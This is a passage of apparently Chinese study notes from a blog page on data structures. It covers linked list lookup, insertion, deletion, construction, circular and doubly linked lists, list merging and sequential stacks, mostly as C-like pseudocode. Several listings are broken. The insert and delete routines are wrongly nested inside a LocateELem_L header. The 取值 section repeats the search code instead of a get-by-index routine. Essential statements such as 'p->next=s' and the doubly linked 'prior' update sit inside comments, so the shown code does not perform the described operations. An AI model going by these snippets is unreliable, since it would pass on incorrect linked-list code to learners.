<span class="comment">//p指向第一个结点</span></span><br><span class="line">i=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span>(p)&#123;<span class="comment">//遍历单链表,统计结点数</span></span><br><span class="line">i++;</span><br><span class="line">p=p-&gt;next; &#125;</span><br><span class="line"><span class="keyword">return</span> i; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">判断表是否为空:</span><br><span class="line"><span class="type">int</span> <span class="title function_">ListEmpty</span><span class="params">(LinkList L)</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="comment">//若L为空表，则返回1，否则返回0</span></span><br><span class="line"><span class="keyword">if</span>(L-&gt;next) <span class="comment">//非空</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="取值-1"><a href="#取值-1" class="headerlink" title="取值"></a>取值</h4><p>链表不是随机存取结构</p><blockquote><p>【算法步骤】</p></blockquote><ul><li>从第1个结点（L-&gt;next）顺链扫描，用指针p指向当前扫描到的结点，p初值p &#x3D; L-&gt;next。 </li><li>j做计数器，累计当前扫描过的结点数，j初值为1。当p指向扫描到的下一结点时，计数器j加1。</li><li>当j &#x3D; i时，p所指的结点就是要找的第i个结点。</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//返回L中值为e的数据元素的位置序号，查找失败返回0</span></span><br><span class="line">p=L-&gt;next; j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(p &amp;&amp;p-&gt;data!=e) </span><br><span class="line">&#123;p=p-&gt;next; j++;&#125; </span><br><span class="line"><span class="keyword">if</span>(p) <span class="keyword">return</span> j; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h4><blockquote><p>【算法步骤】</p></blockquote><ul><li>从第一个结点起，依次和e相比较。 </li><li>如果找到一个其值与e相等的数据元素，则返回其在链表中的“位置”或地址（第几个元素，注意j的初始值为1）； </li><li>如果查遍整个链表都没有找到其值和e相等的元素，则返回0 或“NULL”。</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//返回L中值为e的数据元素的位置序号，查找失败返回0</span></span><br><span class="line">p=L-&gt;next; j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(p &amp;&amp;p-&gt;data!=e) </span><br><span class="line">&#123;p=p-&gt;next; j++;&#125; </span><br><span class="line"><span class="keyword">if</span>(p) <span class="keyword">return</span> j; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h4><blockquote><p>【算法步骤】</p></blockquote><ul><li>找到ai-1存储位置p</li><li>生成一个新结点*s</li><li>将新结点*s的数据域置为x</li><li>新结点*s的指针域指向结点ai</li><li>令结点 *p 的指针域指向新结点 *s</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//在L中第i个元素之前插入数据元素e </span></span><br><span class="line">Status <span class="title function_">ListInsert_L</span><span class="params">(LinkList &amp;L, <span class="type">int</span> i, ElemType e)</span>&#123; </span><br><span class="line">p=L; j=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span>(p&amp;&amp;j&lt;i−<span class="number">1</span>)&#123;p=p-&gt;next;++j;&#125; <span class="comment">//寻找第i−1个结点</span></span><br><span class="line"><span class="keyword">if</span>(!p || j&gt;i−<span class="number">1</span>) <span class="keyword">return</span> ERROR; <span class="comment">//i大于表长 + 1或者小于1 </span></span><br><span class="line">s=new LNode; <span class="comment">//生成新结点s </span></span><br><span class="line">s-&gt;data=e; <span class="comment">//将结点s的数据域置为e </span></span><br><span class="line">s-&gt;next=p-&gt;next; <span class="comment">//将结点s插入L中 p-&gt;next=s; </span></span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;<span class="comment">//ListInsert_L</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><blockquote><p>【算法步骤】</p></blockquote><ul><li>（1）找到ai-1存储位置p </li><li>（2）临时保存结点ai的地址在q中，以备释放</li><li>（3）令p-＞next指向ai的直接后继结点</li><li>（4）将ai的值保留在e中</li><li>（5）释放结点ai的空间</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">LocateELem_L</span> <span class="params">(LinkList L，Elemtype e)</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将线性表L中第i个数据元素删除</span></span><br><span class="line">Status <span class="title function_">ListDelete_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span>&#123;</span><br><span class="line">p=L;j=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span>(p-&gt;next &amp;&amp;j&lt;i<span class="number">-1</span>)&#123; <span class="comment">//寻找第i个结点，并令p指向其前驱ai-1</span></span><br><span class="line">p=p-&gt;next; ++j; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(!(p-&gt;next)||j&gt;i<span class="number">-1</span>) <span class="keyword">return</span> ERROR; <span class="comment">//删除位置不合理(i&gt;n或i&lt;1)</span></span><br><span class="line">q=p-&gt;next; <span class="comment">//临时保存被删结点的地址以备释放</span></span><br><span class="line">p-&gt;next=q-&gt;next; <span class="comment">//改变删除结点前驱结点的指针域</span></span><br><span class="line">e=q-&gt;data; <span class="comment">//保存删除结点的数据域</span></span><br><span class="line">delete q; <span class="comment">//释放删除结点的空间</span></span><br><span class="line"><span class="keyword">return</span> OK; </span><br><span class="line">&#125;<span class="comment">//ListDelete_L</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>【算法分析】</p></blockquote><p>-p-&gt;next &#x3D; p-&gt;next-&gt;next 可以吗???</p><p>不行！节点ai无法释放空间</p><h3 id="5-4链表的运算时间效率分析"><a href="#5-4链表的运算时间效率分析" class="headerlink" title="5.4链表的运算时间效率分析"></a>5.4链表的运算时间效率分析</h3><ol><li><p>查找: 因线性链表只能顺序存取，即在查找时要从头指针找起，查找的时间复杂度为 O(n)。</p></li><li><p>插入和删除: 因线性链表不需要移动元素，只要修改指针，在确定插入和删除位置后，时间复杂度为O(1)。</p></li></ol><p>但是，如果要在单链表中进行前插或删除操作，由于要<br>从头查找前驱结点，所耗时间复杂度为 O(n) 。</p><h3 id="5-5单链表的建立（前插法）"><a href="#5-5单链表的建立（前插法）" class="headerlink" title="5.5单链表的建立（前插法）"></a>5.5单链表的建立（前插法）</h3><blockquote><p>【算法步骤】</p></blockquote><ul><li>建立线性表的链式存储过程即是动态生成链表的过程</li><li>从一个空表开始，重复读入数据<ul><li>生成新结点*p </li><li>将读入数据存放到新结点*p的数据域中</li><li>将该新结点*p插入到链表的前端</li></ul></li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_F</span><span class="params">(LinkList &amp;L,<span class="type">int</span> n)</span>&#123;</span><br><span class="line"><span class="comment">//逆位序输入n个元素的值，建立带表头结点的单链表L </span></span><br><span class="line">L=new LNode; </span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的单链表</span></span><br><span class="line"><span class="keyword">for</span>(i=n; i&gt;<span class="number">0</span>; --i)&#123; </span><br><span class="line">p=new LNode; <span class="comment">//生成新结点</span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;p-&gt;data; <span class="comment">//输入元素值</span></span><br><span class="line">p-&gt;next=L-&gt;next;L-&gt;next=p; <span class="comment">//插入到表头</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;<span class="comment">//CreateList_F</span></span><br></pre></td></tr></table></figure><h3 id="5-6单链表的建立（尾插法）"><a href="#5-6单链表的建立（尾插法）" class="headerlink" title="5.6单链表的建立（尾插法）"></a>5.6单链表的建立（尾插法）</h3><blockquote><p>【算法步骤】</p></blockquote><ul><li>从一个空表L开始，将新结点逐个插入到链表的尾部，尾指针r指向链表的尾结点。</li><li>初始时，r同L均指向头结点。每读入一个数据元素则申请一个新结点，将新结点插入到尾结点后，r指向新结点</li></ul><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_L</span><span class="params">(LinkList &amp;L,<span class="type">int</span> n)</span>&#123; </span><br><span class="line"><span class="comment">//正位序输入n个元素的值，建立带表头结点的单链表L </span></span><br><span class="line">L=new LNode; </span><br><span class="line">L-&gt;next=<span class="literal">NULL</span>; <span class="comment">//先建立一个带头结点的单链表</span></span><br><span class="line">r=L; <span class="comment">//尾指针r指向头结点</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123; </span><br><span class="line">p=new LNode; <span class="comment">//生成新结点</span></span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;p-&gt;data; <span class="comment">//输入元素值</span></span><br><span class="line">p-&gt;next=<span class="literal">NULL</span>; r-&gt;next=p; <span class="comment">//插入到表尾</span></span><br><span class="line">r=p; <span class="comment">//r指向新的尾结点</span></span><br><span class="line">&#125; </span><br><span class="line">&#125;<span class="comment">//CreateList_L</span></span><br></pre></td></tr></table></figure><h3 id="5-7循环链表"><a href="#5-7循环链表" class="headerlink" title="5.7循环链表"></a>5.7循环链表</h3><p>循环链表：表中最后一个节点的指针域指向头结点，整个链表形成一个环。</p><p><img src="/img/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8.png" alt="循环链表"></p><p>从循环链表中的任何一个结点的位置都可以找到其他所有结点，而单链表做不到；</p><p><img src="/img/%E5%BE%AA%E7%8E%AF%E9%93%BE%E8%A1%A8%E9%81%BF%E5%85%8D%E6%AD%BB%E5%BE%AA%E7%8E%AF.png" alt="循环链表避免死循环"></p><p>对循环链表，有时不给出头指针，而给出尾指针<br>可以更方便的找到第一个和最后一个结点</p><blockquote><p>如何查找开始结点和终端结点？</p></blockquote><pre><code>开始结点：rear-&gt;next-&gt;next终端结点：rear</code></pre><p>循环链表的合并（Ta表尾连接Tb表头，Tb表尾连接Ta表头，去除Tb的表头）</p><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">Connect</span><span class="params">(LinkList Ta, LinkList Tb)</span></span><br><span class="line">&#123;<span class="comment">//假设Ta、Tb都是非空的单循环链表</span></span><br><span class="line">p=Ta-&gt;next;<span class="comment">//①p存表头结点</span></span><br><span class="line">Ta-&gt;next=Tb-&gt;next-&gt;next;<span class="comment">//②Tb表头(Tb-&gt;next-&gt;next，即Tb第一个元素节点)连结Ta表尾(Ta-&gt;next)，注意不包括Tb的头结点！</span></span><br><span class="line">deleteTb-&gt;next;<span class="comment">//③释放Tb表头结点</span></span><br><span class="line">Tb-&gt;next=p;<span class="comment">//④Tb的表尾连接到Ta的头结点</span></span><br><span class="line"><span class="keyword">return</span> Tb;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>约瑟夫问题</p></blockquote><p>在罗马人占领乔塔帕特后39 个犹太人与约瑟夫及他的朋友躲到一个洞中39个犹太人决定宁愿死也不要被敌人抓到，于是决定了一个自杀方式：</p><p>41个人排成一个圆圈，由第1个人开始报数，每报数到第3人该人就必须自杀，然后再由下一个重新报数，直到所有人都自杀身亡为止。<br>然而约瑟夫和他的朋友并不想遵从，要他的朋友先假装遵从，他将朋友与自己安排在第16个与第31个位置，于是逃过了这场死亡游戏</p><p>约瑟夫问题的解法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Josephus</span> <span class="params">( <span class="type">int</span> n, <span class="type">int</span> m )</span> &#123;</span><br><span class="line">Firster ( ); <span class="comment">//检验指针指向第一个结点</span></span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++ ) &#123; <span class="comment">//执行n-1次</span></span><br><span class="line"><span class="keyword">for</span> ( <span class="type">int</span> j = <span class="number">0</span>; j &lt; m<span class="number">-1</span>; j++ ) Next ( );</span><br><span class="line"><span class="comment">//循环m次使current指向被删除结点</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; “出列的人是” &lt;&lt; GetElem_L ( ) &lt;&lt; <span class="built_in">endl</span>; <span class="comment">//出列人员的数据</span></span><br><span class="line">ListDelete ( ); <span class="comment">//删去每一趟的第m结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-8双向链表"><a href="#5-8双向链表" class="headerlink" title="5.8双向链表"></a>5.8双向链表</h3><p>单链表只能先后寻查其他节点，如要寻查节点的直接前驱则只能从表头指针出发，而双向链表可解决这个问题。</p><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A81.png" alt="双向链表1"></p><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A82.png" alt="双向链表2"></p><h3 id="5-9双向链表的删除"><a href="#5-9双向链表的删除" class="headerlink" title="5.9双向链表的删除"></a>5.9双向链表的删除</h3><p>对比单链表为什么用两个指针？</p><ol><li>节点a的后继指针域指向节点c<br> p-&gt;prior-&gt;next&#x3D;p-&gt;next;</li></ol><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%A0%E9%99%A41.png" alt="双向链表的删除1"></p><ol start="2"><li>节点c的前驱指针域指向节点a<br>p-&gt;next-&gt;prior&#x3D;p-&gt;prior;</li></ol><p><img src="/img/%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%E7%9A%84%E5%88%A0%E9%99%A42.png" alt="双向链表的删除2"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">ListDelete_DuL</span><span class="params">(DuLinkList &amp;L,<span class="type">int</span> i,ElemType &amp;e)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!(p=GetElemP_DuL(L,i))) <span class="keyword">return</span> ERROR; <span class="comment">//在L中确定第i</span></span><br><span class="line">个位置元素的位置指针p，p为空时元素不存在</span><br><span class="line">e=p-&gt;data; <span class="comment">//保存被删除节点的值</span></span><br><span class="line">p-&gt;prior-&gt;next=p-&gt;next; <span class="comment">//节点a的后继指针域指向节点c p-&gt;next-&gt;prior=p-&gt;prior; //节点c的前驱指针域指向节点a</span></span><br><span class="line">delete p; <span class="comment">//释放被删除节点空间</span></span><br><span class="line"><span class="keyword">return</span> OK; &#125;</span><br></pre></td></tr></table></figure><h2 id="6顺序表和链表的比较"><a href="#6顺序表和链表的比较" class="headerlink" title="6顺序表和链表的比较"></a>6顺序表和链表的比较</h2><p><img src="/img/%E9%A1%BA%E5%BA%8F%E8%A1%A8%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E6%AF%94%E8%BE%83.png" alt="顺序表和链表的比较"></p><h2 id="7线性表的应用"><a href="#7线性表的应用" class="headerlink" title="7线性表的应用"></a>7线性表的应用</h2><h3 id="7-1线性表的合并"><a href="#7-1线性表的合并" class="headerlink" title="7.1线性表的合并"></a>7.1线性表的合并</h3><p>问题描述：<br>假设利用两个线性表La和Lb分别表示两个集合<br>A和B,现要求一个新的集合<br>    A&#x3D;A B</p><pre><code>    La=(7, 5, 3, 11)    Lb=(2, 6, 3)    La=(7, 5, 3, 11, 2, 6)</code></pre><blockquote><p>【算法步骤】</p></blockquote><p>依次取出Lb 中的每个元素，执行以下操作：</p><ul><li>1.在La中查找该元素</li><li>2.如果找不到，则将其插入La的最后</li></ul><p>既可以用顺序表实现，也可以用链表实现</p><blockquote><p>【算法描述】</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">union</span><span class="params">(List &amp;La, List Lb)</span>&#123;</span><br><span class="line">La_len=ListLength(La);</span><br><span class="line">Lb_len=ListLength(Lb);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=Lb_len;i++)&#123;</span><br><span class="line">GetElem(Lb, i, e);</span><br><span class="line"><span class="keyword">if</span>(!LocateElem(La,e)) <span class="comment">//La中不存在和e相同的元素</span></span><br><span class="line">ListInsert(&amp;La,++La_len,e); <span class="comment">//将e插在La的最后并长度加1 </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-2有序表的合并"><a href="#7-2有序表的合并" class="headerlink" title="7.2有序表的合并"></a>7.2有序表的合并</h3><p>已知线性表La 和Lb中的数据元素按值非递减有序排列，现要求将La和Lb归并为一个新的线性表Lc,且Lc中的数据元素仍按值非递减有序排列。</p><blockquote><p>【算法步骤】－有序的顺序表合并</p></blockquote><ul><li>创建一个空表Lc，长度为La和Lb的长度之和</li><li>依次从 La 或 Lb中“摘取”元素值较小的结点插入到 Lc 表的最后，直至其中一个表变空为止</li><li>继续将 La 或 Lb其中一个表的剩余结点插入在 Lc表的最后</li></ul><blockquote><p>【算法描述】－有序的顺序表合并</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeList_Sq</span><span class="params">(SqList LA,SqList LB,SqList &amp;LC)</span>&#123; </span><br><span class="line">pa=LA.elem; pb=LB.elem; <span class="comment">//指针pa和pb的初值分别指向两个表的第一个元素</span></span><br><span class="line">LC.length=LA.length+LB.length; <span class="comment">//新表长度为待合并两表的长度之和</span></span><br><span class="line">LC.elem=new ElemType[LC.length]; <span class="comment">//为合并后的新表分配一个数组空间</span></span><br><span class="line">pc=LC.elem; <span class="comment">//指针pc指向新表的第一个元素</span></span><br><span class="line">pa_last=LA.elem+LA.length<span class="number">-1</span>; <span class="comment">//指针pa_last指向LA表的最后一个元素</span></span><br><span class="line">pb_last=LB.elem+LB.length<span class="number">-1</span>; <span class="comment">//指针pb_last指向LB表的最后一个元素</span></span><br><span class="line"><span class="keyword">while</span>(pa&lt;=pa_last &amp;&amp; pb&lt;=pb_last)&#123; <span class="comment">//两个表都非空</span></span><br><span class="line"><span class="keyword">if</span>(*pa&lt;=*pb) *pc++=*pa++; <span class="comment">//依次“摘取”两表中值较小的结点</span></span><br><span class="line"><span class="keyword">else</span> *pc++=*pb++; &#125;; </span><br><span class="line"><span class="keyword">while</span>(pa&lt;=pa_last) *pc++=*pa++ <span class="comment">//LB已到达表尾，依次将LA剩余元素插入LC</span></span><br><span class="line"><span class="keyword">while</span>(pb&lt;=pb_last) *pc++=*pb++; <span class="comment">//LA已到达表尾，依次将LB剩余元素插入LC</span></span><br><span class="line">&#125;<span class="comment">//MergeList_Sq</span></span><br></pre></td></tr></table></figure><blockquote><p>【算法步骤】－有序的链表合并</p></blockquote><ul><li>Lc指向La</li><li>依次从 La 或 Lb 中“摘取”元素值较小的结点插入到 Lc 表的最后，直至其中一个表变空为止。</li><li>继续将 La 或 Lb 其中一个表的剩余结点插入在Lc 表的最后。</li><li>释放 Lb 表的表头结点</li></ul><blockquote><p>【算法描述】－有序的链表合并</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">MergeList_L</span><span class="params">(LinkList &amp;La,LinkList &amp;Lb,LinkList &amp;Lc)</span>&#123;</span><br><span class="line">pa=La-&gt;next; pb=Lb-&gt;next;</span><br><span class="line">pc=Lc=La; <span class="comment">//用La的头结点作为Lc的头结点</span></span><br><span class="line"><span class="keyword">while</span>(pa &amp;&amp; pb)&#123;</span><br><span class="line"><span class="keyword">if</span>(pa-&gt;data&lt;=pb-&gt;data)&#123; pc-&gt;next=pa;pc=pa;pa=pa-&gt;next;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;pc-&gt;next=pb; pc=pb; pb=pb-&gt;next;&#125;</span><br><span class="line">pc-&gt;next=pa?pa:pb; <span class="comment">//插入剩余段</span></span><br><span class="line">delete Lb;&#125; <span class="comment">//释放Lb的头结点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8总结"><a href="#8总结" class="headerlink" title="8总结"></a>8总结</h2><p><img src="/img/%E5%B0%8F%E7%BB%93.png" alt="小结"></p><h1 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h1><h2 id="1-栈和队列的定义和特点"><a href="#1-栈和队列的定义和特点" class="headerlink" title="1 栈和队列的定义和特点"></a>1 栈和队列的定义和特点</h2><blockquote><p>栈</p></blockquote><pre><code>01 定 义： 只能在表的一端（栈顶）进行插入和删除运算的线性表（受限）02 逻辑结构：与线性表相同，仍为一对一关系03 存储结构：用顺序栈或链栈存储均可，但以顺序栈更常见       04 运算规则：只能在栈顶运算，且访问结点时依照后进先出（LIFO）或先进后出（FILO）的原则05 实现方式：关键是编写入栈和出栈函数，具体实现依顺序栈或链栈的不同而不同基本操作有入栈、出栈、读栈顶元素值、建栈、判断栈满、栈空等</code></pre><blockquote><p>队列</p></blockquote><pre><code>01 定 义： 只能在表的一端（队尾）进行插入，在另一端（队头）进行删除运算的线性表02 逻辑结构：与线性表相同，仍为一对一关系03 存储结构：用顺序队列或链队存储均可04 运算规则：先进先出（FIFO）05 实现方式：关键是编写入队和出队函数，具体实现依顺序队或链队的不同而不同</code></pre><p><img src="/img/%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97%E5%92%8C%E4%B8%80%E8%88%AC%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="栈与队列和一般线性表的区别"></p><h2 id="2-案例引入"><a href="#2-案例引入" class="headerlink" title="2 案例引入"></a>2 案例引入</h2><p>案例3.1 ：一元多项式的运算</p><p>案例3.2：号匹配的检验</p><p>案例3.3 ：表达式求值</p><p>案例3.4 ：舞伴问题</p><h2 id="3-栈的表示和操作的实现"><a href="#3-栈的表示和操作的实现" class="headerlink" title="3 栈的表示和操作的实现"></a>3 栈的表示和操作的实现</h2><p><img src="/img/%E6%A0%88%E7%9A%84%E8%A1%A8%E7%A4%BA.jpg" alt="栈的表示"></p><blockquote><p>顺序栈的表示</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">SElemType *base; <span class="comment">//栈底指针</span></span><br><span class="line">SElemType *top; <span class="comment">//栈顶指针</span></span><br><span class="line"><span class="type">int</span> stacksize; <span class="comment">//栈可用的最大容量</span></span><br><span class="line">&#125;SqStack;</span><br></pre></td></tr></table></figure><blockquote><p>顺序栈初始化</p></blockquote><p>步骤：</p><p>(1)分配空间并检查空间是否分配失败，若失败则返回错误</p><p>(2)设置栈底和栈顶指针S.top &#x3D; S.base;</p><p>(3)设置栈大小</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">InitStack</span><span class="params">( SqStack &amp;S )</span></span><br><span class="line">&#123;</span><br><span class="line">S.base =new SElemType[MAXSIZE]；<span class="comment">//动态分配数组</span></span><br><span class="line">空间给顺序栈</span><br><span class="line"><span class="keyword">if</span>( !S.base ) <span class="keyword">return</span> OVERFLOW; <span class="comment">//存储分配失败</span></span><br><span class="line">S.top = S.base; <span class="comment">//top初始为base，空栈</span></span><br><span class="line">S.stackSize = MAXSIZE; <span class="comment">//栈最大容量为MAXSIZE</span></span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>求顺序栈的长度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始为0，添加n个元素为n</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">StackLength</span><span class="params">( SqStack S )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> S.top – S.base; &#125;</span><br></pre></td></tr></table></figure><blockquote><p>清空顺序栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意判断S.base是否为空</span></span><br><span class="line">Status <span class="title function_">ClearStack</span><span class="params">( SqStack S )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( S.base ) <span class="comment">//不为空</span></span><br><span class="line">S.top = S.base;</span><br><span class="line"><span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>销毁顺序栈</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Status <span class="title function_">DestroyStack</span><span class="params">( SqStack &amp;S )</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( 